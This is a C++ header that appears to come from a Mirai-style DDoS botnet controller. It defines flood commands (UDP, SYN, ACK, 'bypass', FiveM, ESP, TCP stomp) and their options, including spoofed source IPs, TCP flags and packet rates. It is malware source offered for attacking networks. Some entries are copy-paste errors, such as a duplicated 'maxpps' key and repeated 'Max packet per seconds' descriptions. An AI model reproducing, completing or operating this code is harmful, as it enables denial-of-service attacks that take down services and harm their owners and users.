#pragma once

#include <map>
#include <string>
#include <list>

#include "def.h"

struct command
{
    uint8_t *buf;
    uint32_t buf_len;
    int time;
} PACKED;

struct process
{
    int fd;
    std::string buf;
    int buf_len;
    struct admin *ptr;
    int count;
    std::string f;
};

static std::map<std::string, uint8_t> flags =
{
    {"port", OPT_PORT},
    {"size", OPT_SIZE},
//    {"threads", OPT_THREAD_COUNT},
    {"path", OPT_HTTP_PATH},
    {"connection", OPT_HTTP_CONNECTION},
    {"domain", OPT_DOMAIN},
    {"ttl", OPT_TTL},
    {"source", OPT_SOURCE_PORT},
    {"ack", OPT_ACK},
    {"fin", OPT_FIN},
    {"urg", OPT_URG},
    {"psh", OPT_PSH},
    {"rst", OPT_RST},
    {"syn", OPT_SYN},
    {"tos", OPT_TOS},
    {"id", OPT_ID},
    {"sequence", OPT_SEQUENCE},
    {"source_ip", OPT_SOURCE_IP},
    {"ack_sequence", OPT_ACK_SEQUENCE},
    {"maxpps", OPT_MAXPPS},
    {"minpps", OPT_MINPPS},
    {"maxlen", OPT_MAXLEN},
    {"maxpps", OPT_MINLEN},
    {"payload", OPT_PAYLOAD},
    {"bind", OPT_BIND},
    {"rand", OPT_RAND},
    {"pps", OPT_PPS},
    {"thread", OPT_THREAD_COUNT}
};

static std::map<std::string, std::string> flag_description =
{
    {"port", "Port given to specify the destination port of the flood (default random)"},
    {"size", "Size of each request sent by the flood (default 900)"},
//    {"threads", "Desired thread count for the specified flood (default 1)"},
    {"path", "HTTP path (default /)"},
    {"connection", "HTTP connection type (default close)"},
    {"domain", "Desired domain to be resolved by the flood"},
    {"ttl", "IP header TTL (default 255)"},
    {"source", "TCP header source port (default random)"},
    {"ack", "ACK flag set in TCP header (default 1 depending on the flood type)"},
    {"fin", "FIN flag set in TCP header"},
    {"urg", "URG flag set in TCP header"},
    {"psh", "PSH flag set in TCP header"},
    {"rst", "RST flag set in TCP header"},
    {"syn", "SYN flag set in the TCP header (default 1 depending on the flood type)"},
    {"tos", "IP header TOS"},
    {"id", "IP header ID (default random)"},
    {"sequence", "TCP header sequence (default random)"},
    {"source_ip", "IP header source IP (255.255.255.255 for random)"},
    {"ack_sequence", "TCP header ACK sequence"},
    {"maxpps", "Max packet per seconds"},
    {"minpps", "Max packet per seconds"},
    {"maxlen", "Max packet per seconds"},
    {"minlen", "Max packet per seconds"},
    {"payload", "Max packet per seconds"},
    {"bind", "Max packet per seconds"},
    {"rand", "Max packet per seconds"},
    {"pps", "Max packet per seconds"}

};

static std::map<std::string, uint8_t> command_ids =
{
    {"udpflood", FLOOD_UDPPLAIN},
    {"synflood", FLOOD_SYNPLAIN},
    {"ackflood", FLOOD_ACKPLAIN},
	{"udpbypass", FLOOD_UDPBYPASS},
    {"tcpmix", FLOOD_SYNACK},
    {"ipsec", FLOOD_UDPESP},
    {"hex", FLOOD_UDPHEX},
    {"udpfivem", FLOOD_UDPFIVEM},
    {"tcpstomp", FLOOD_TCPSTOMP}
};

static std::map<std::string, std::list<uint8_t>> commands =
{
    {"udpflood", {OPT_PORT, OPT_SIZE}},
    {"ackflood", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
                  OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
                  OPT_TOS, OPT_ID, OPT_SEQUENCE, OPT_SOURCE_IP, OPT_ACK_SEQUENCE}},
    {"synflood", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
                  OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
                  OPT_TOS, OPT_ID, OPT_SEQUENCE, OPT_SOURCE_IP, OPT_ACK_SEQUENCE, OPT_HANDSHAKE}},
	{"udpbypass", {OPT_PORT, OPT_SIZE}},
    {"tcpstomp", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
              OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
              OPT_TOS, OPT_ID, OPT_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ, OPT_DOMAIN, OPT_HTTP_CONNECTION, OPT_HTTP_PATH}},
    {"ipsec", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
             OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
             OPT_TOS, OPT_ID, OPT_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"udpfivem", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
             OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
             OPT_TOS, OPT_ID, OPT_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}},
    {"hex", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
             OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
             OPT_TOS, OPT_ID, OPT_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ, OPT_MAXPPS,
             OPT_MINPPS, OPT_MAXLEN, OPT_MINLEN, OPT_RAND, OPT_BIND, OPT_PAYLOAD, OPT_PPS, OPT_THREAD_COUNT}},
    {"tcpmix", {OPT_PORT, OPT_SIZE, OPT_TTL, OPT_SOURCE_PORT, OPT_ACK,
              OPT_FIN, OPT_URG, OPT_PSH, OPT_RST, OPT_SYN,
              OPT_TOS, OPT_ID, OPT_SEQ, OPT_SOURCE_IP, OPT_ACK_SEQ}}
};

static std::map<std::string, std::string> command_description =
{
    {"ackflood", "Simple TCP flood. (ACK)"},
    {"synflood", "Simple TCP flood. (SYN)"},
    {"udpflood", "Simple UDP flood. (RAW)"},
    {"udpbypass", "Bypass UDP flood. (RAW)"}

};
